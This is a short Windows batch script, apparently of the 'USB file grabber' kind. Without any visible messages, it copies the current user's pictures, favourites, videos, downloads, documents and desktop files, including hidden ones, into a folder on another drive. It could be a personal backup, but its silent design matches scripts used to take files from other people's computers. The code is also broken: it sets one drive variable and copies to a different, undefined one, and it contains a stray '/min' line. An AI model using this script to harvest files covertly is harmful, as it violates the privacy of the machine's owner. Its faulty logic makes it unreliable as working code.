@echo off 
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\My pics"
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favs"
%backupcmd% "%USERPROFILE%\videos" "%drive%\all\vids"
%backupcmd% "%USERPROFILE%\Downloads" "%drive%\all\Download"
%backupcmd% "%USERPROFILE%\Documents" "%drive%\all\Docs"
%backupcmd% "%USERPROFILE%\Desktop" "%drive%\all\desk"
@echo off
cls